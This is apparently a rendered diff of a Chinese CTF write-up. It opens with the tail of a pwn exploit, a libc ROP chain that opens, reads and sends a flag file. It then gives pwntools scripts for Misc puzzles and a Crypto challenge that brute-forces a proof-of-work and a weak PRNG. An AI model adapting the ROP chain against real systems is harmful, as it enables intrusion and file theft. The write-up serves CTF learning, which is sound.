+warning(hex(libc<span style="color:#f92672">.</span>address))<span style="color:#960050;background-color:#1e0010">​</span>
+r12_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000002f709</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000023b6a</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+rsi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000002601f</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+one <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe3afe</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000022679</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+rcx_rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000010257e</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+rdx_ret  <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x0000000000142c92</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))<span style="color:#960050;background-color:#1e0010">​</span>
+flag <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1ec000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span><span style="color:#960050;background-color:#1e0010">​</span>
+rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000036174</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000000630a9</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">=</span> p64(rdi_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rsi_ret) <span style="color:#f92672">+</span> p64(flag)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rdx_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">8</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rax) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(syscall)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rdi_ret) <span style="color:#f92672">+</span> p64(flag) <span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rsi_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rdx_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rax) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">2</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(syscall)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rdi_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rsi_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">3</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rdx_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rcx_rbx) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(rax) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x28</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+pay <span style="color:#f92672">+=</span> p64(syscall)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>send(pay)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag</span><span style="color:#ae81ff">\x00\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># p.sendline(&#39;cat flag&#39;)​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="misc">Misc</h2>
+<h3 id="welcome">welcome</h3>
+<p>签到，复制粘贴。​</p>
+<h3 id="s3quences">S3qUenCEs​</h3>
+<p>序列按照模k划分等价类，可以推导出一次操作会让所有等价类的其中一位取反，即让等价类的全部奇偶性整体改变，故分类讨论最终取反数量是奇数还是偶数，在等价类内排序贪心取数即可。​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;bits/stdc++.h&gt;​</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e">#define mem(a,b) memset(a,b,sizeof(a))​
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> LL;<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">typedef</span> pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span>,<span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> PII;<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e">#define X first​
+</span><span style="color:#75715e">#define Y second​
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">inline</span> LL read()<span style="color:#960050;background-color:#1e0010">​</span>
+{<span style="color:#960050;background-color:#1e0010">​</span>
+        LL x<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>,f<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;<span style="color:#66d9ef">char</span> c<span style="color:#f92672">=</span>getchar();<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span>isdigit(c)){<span style="color:#66d9ef">if</span>(c<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;-&#39;</span>)f<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span>;c<span style="color:#f92672">=</span>getchar();}<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">while</span>(isdigit(c)){x<span style="color:#f92672">=</span>x<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span><span style="color:#f92672">+</span>c<span style="color:#f92672">-</span><span style="color:#e6db74">&#39;0&#39;</span>;c<span style="color:#f92672">=</span>getchar();}<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">return</span> x<span style="color:#f92672">*</span>f;<span style="color:#960050;background-color:#1e0010">​</span>
+}<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> maxn<span style="color:#f92672">=</span><span style="color:#ae81ff">1000010</span>;<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">int</span> n,k;<span style="color:#960050;background-color:#1e0010">​</span>
+LL a[maxn],ans1,ans2;<span style="color:#960050;background-color:#1e0010">​</span>
+vector <span style="color:#f92672">&lt;</span>LL<span style="color:#f92672">&gt;</span> V[maxn],pre[maxn];<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">int</span> main()<span style="color:#960050;background-color:#1e0010">​</span>
+{<span style="color:#960050;background-color:#1e0010">​</span>
+        freopen(<span style="color:#e6db74">&#34;input.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>,stdin);<span style="color:#960050;background-color:#1e0010">​</span>
+        n<span style="color:#f92672">=</span>read();k<span style="color:#f92672">=</span>read();<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)a[i]<span style="color:#f92672">=</span>read(),V[i<span style="color:#f92672">%</span>k].push_back(a[i]);<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>k;i<span style="color:#f92672">++</span>)sort(V[i].begin(),V[i].end());<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>k;i<span style="color:#f92672">++</span>){<span style="color:#960050;background-color:#1e0010">​</span>
+                LL tmp<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#960050;background-color:#1e0010">​</span>
+                <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> u: V[i]){<span style="color:#960050;background-color:#1e0010">​</span>
+                        tmp<span style="color:#f92672">+=</span>u;<span style="color:#960050;background-color:#1e0010">​</span>
+                        pre[i].push_back(tmp);<span style="color:#960050;background-color:#1e0010">​</span>
+                }<span style="color:#960050;background-color:#1e0010">​</span>
+        }<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>k;i<span style="color:#f92672">++</span>){<span style="color:#960050;background-color:#1e0010">​</span>
+                LL now_ans<span style="color:#f92672">=</span>pre[i][V[i].size()<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>];<span style="color:#960050;background-color:#1e0010">​</span>
+                <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;j<span style="color:#f92672">&lt;=</span>V[i].size();j<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>){<span style="color:#960050;background-color:#1e0010">​</span>
+                        now_ans<span style="color:#f92672">=</span>max(now_ans,pre[i][V[i].size()<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>pre[i][j<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]);<span style="color:#960050;background-color:#1e0010">​</span>
+                }<span style="color:#960050;background-color:#1e0010">​</span>
+                ans1<span style="color:#f92672">+=</span>now_ans;<span style="color:#960050;background-color:#1e0010">​</span>
+        }<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>k;i<span style="color:#f92672">++</span>){<span style="color:#960050;background-color:#1e0010">​</span>
+                LL now_ans<span style="color:#f92672">=</span>pre[i][V[i].size()<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>pre[i][<span style="color:#ae81ff">0</span>];<span style="color:#960050;background-color:#1e0010">​</span>
+                <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>;j<span style="color:#f92672">&lt;=</span>V[i].size();j<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>){<span style="color:#960050;background-color:#1e0010">​</span>
+                        now_ans<span style="color:#f92672">=</span>max(now_ans,pre[i][V[i].size()<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>pre[i][j<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]);<span style="color:#960050;background-color:#1e0010">​</span>
+                }<span style="color:#960050;background-color:#1e0010">​</span>
+                ans2<span style="color:#f92672">+=</span>now_ans;<span style="color:#960050;background-color:#1e0010">​</span>
+        }<span style="color:#960050;background-color:#1e0010">​</span>
+        printf(<span style="color:#e6db74">&#34;%lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,max(ans1,ans2));<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;<span style="color:#960050;background-color:#1e0010">​</span>
+}<span style="color:#960050;background-color:#1e0010">​</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">import</span> re<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">import</span> os<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;172.51.223.76&#34;</span>,<span style="color:#ae81ff">9999</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+print(r<span style="color:#f92672">.</span>recv())<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+        s <span style="color:#f92672">=</span> str(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Challenge Input:&#34;</span>))<span style="color:#960050;background-color:#1e0010">​</span>
+        ss <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Give me your output&#34;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;input.txt&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:<span style="color:#960050;background-color:#1e0010">​</span>
+            f<span style="color:#f92672">.</span>write(ss)<span style="color:#960050;background-color:#1e0010">​</span>
+        f<span style="color:#f92672">.</span>close()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+        ans <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">a.exe&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip() <span style="color:#75715e"># gcc编译sol.cpp得到a.exe​</span>
+        print(ans)<span style="color:#960050;background-color:#1e0010">​</span>
+        r<span style="color:#f92672">.</span>sendline(ans<span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+print(r<span style="color:#f92672">.</span>recv())<span style="color:#960050;background-color:#1e0010">​</span>
+print(r<span style="color:#f92672">.</span>recv())
+</code></pre></div><h3 id="babymisc">Babymisc​</h3>
+<p>猜数问题，需要在15步之内猜出一个六位数，可以采用二分法。​
+由于六位数二分法最多需要19次才能完全猜中，因此无法在100000-999999范围内猜。可以找一个长度为20000-30000的范围进行查找，若答案落在该范围内，则在15步内可以精确命中。​
+多运行几次脚本，直至某一次答案落在范围内即可。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
+context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;debug&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">import</span> os<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;172.51.223.233&#34;</span>,<span style="color:#ae81ff">9999</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;select start</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&#34;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;Y&#39;</span><span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">500000</span><span style="color:#960050;background-color:#1e0010">​</span>
+    right <span style="color:#f92672">=</span> <span style="color:#ae81ff">530000</span><span style="color:#960050;background-color:#1e0010">​</span>
+    low, up <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">False</span><span style="color:#960050;background-color:#1e0010">​</span>
+    s <span style="color:#f92672">=</span> str(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;enter a number:&#34;</span>))<span style="color:#960050;background-color:#1e0010">​</span>
+    k <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+    r<span style="color:#f92672">.</span>sendline(str(k)<span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">14</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+        s <span style="color:#f92672">=</span> str(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;enter a number:&#34;</span>))<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;low&#34;</span> <span style="color:#f92672">in</span> s:<span style="color:#960050;background-color:#1e0010">​</span>
+            left <span style="color:#f92672">=</span> k<span style="color:#960050;background-color:#1e0010">​</span>
+            low <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span><span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">else</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+            right <span style="color:#f92672">=</span> k<span style="color:#960050;background-color:#1e0010">​</span>
+            up <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span><span style="color:#960050;background-color:#1e0010">​</span>
+        k <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+        r<span style="color:#f92672">.</span>sendline(str(k)<span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+    res <span style="color:#f92672">=</span> str(r<span style="color:#f92672">.</span>recv())<span style="color:#960050;background-color:#1e0010">​</span>
+    print(up, low)<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> up <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span> <span style="color:#f92672">and</span> low <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">break</span><span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;lost&#34;</span> <span style="color:#f92672">in</span> res:<span style="color:#960050;background-color:#1e0010">​</span>
+        print(res)<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">break</span>
+</code></pre></div><h2 id="crypto">Crypto</h2>
+<h3 id="weekrandom">weekrandom</h3>
+<p>运行下源程序发现每一轮随机数result的后四位和x的后四位一样，前四位是sha256(x)哈希结果的[-8:-4]切片，x的十六进制串大概只有8-9位。​
+因此先随机交个数拿到第一个result，在0-0xfffff中爆破x的前五位和result后四位拼一下，算sha256的[-8:-4]是否等于result的前四位。​
+只算一轮的话可能有多个x满足条件，可以再提交一个数得到第二轮可能的x，看看第一轮的所有可能的值i中是否有一个i满足(i^2//100) % 10000000000在第二轮可能的值中，即可找到x链。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">from</span> re <span style="color:#f92672">import</span> findall<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">next</span>(x):<span style="color:#960050;background-color:#1e0010">​</span>
+    x <span style="color:#f92672">=</span> int((x <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">//</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>))) <span style="color:#f92672">%</span> <span style="color:#ae81ff">10000000000</span><span style="color:#960050;background-color:#1e0010">​</span>
+    high <span style="color:#f92672">=</span> (int(hashlib<span style="color:#f92672">.</span>sha256(str(x)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(),<span style="color:#ae81ff">16</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    low <span style="color:#f92672">=</span> x <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    result <span style="color:#f92672">=</span> high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">|</span> low<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">return</span> x,result<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;172.51.223.64&#34;</span>,<span style="color:#ae81ff">9998</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+alp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+Pow <span style="color:#f92672">=</span> str(r<span style="color:#f92672">.</span>recv())<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+given <span style="color:#f92672">=</span> Pow[<span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">30</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+target <span style="color:#f92672">=</span> Pow[<span style="color:#ae81ff">35</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">18</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> alp:<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> alp:<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> alp:<span style="color:#960050;background-color:#1e0010">​</span>
+            <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> alp:<span style="color:#960050;background-color:#1e0010">​</span>
+                <span style="color:#66d9ef">if</span> sha256((i<span style="color:#f92672">+</span>j<span style="color:#f92672">+</span>k<span style="color:#f92672">+</span>l<span style="color:#f92672">+</span>given)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> target:<span style="color:#960050;background-color:#1e0010">​</span>
+                    r<span style="color:#f92672">.</span>sendline((i<span style="color:#f92672">+</span>j<span style="color:#f92672">+</span>k<span style="color:#f92672">+</span>l)<span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+                    <span style="color:#66d9ef">break</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+print(i<span style="color:#f92672">+</span>j<span style="color:#f92672">+</span>k<span style="color:#f92672">+</span>l)<span style="color:#960050;background-color:#1e0010">​</span>
+s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recv()<span style="color:#960050;background-color:#1e0010">​</span>
+print(s)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">.</span>encode())<span style="color:#960050;background-color:#1e0010">​</span>
+ininum <span style="color:#f92672">=</span> int(findall(<span style="color:#e6db74">&#39;\d+&#39;</span>,str(r<span style="color:#f92672">.</span>recv()))[<span style="color:#ae81ff">0</span>])<span style="color:#960050;background-color:#1e0010">​</span>
+print(ininum)<span style="color:#960050;background-color:#1e0010">​</span>
+xlow <span style="color:#f92672">=</span> hex(ininum)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[<span style="color:#ae81ff">4</span>:]<span style="color:#960050;background-color:#1e0010">​</span>
+thash <span style="color:#f92672">=</span> hex(ininum)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>)[:<span style="color:#ae81ff">4</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+pos1 <span style="color:#f92672">=</span> []<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xfffff</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    x <span style="color:#f92672">=</span> int(hex(i)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> xlow,<span style="color:#ae81ff">16</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    allhash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(x)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> allhash[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> thash:<span style="color:#960050;background-color:#1e0010">​</span>
+        pos1<span style="color:#f92672">.</span>append(x)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+print(pos1)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
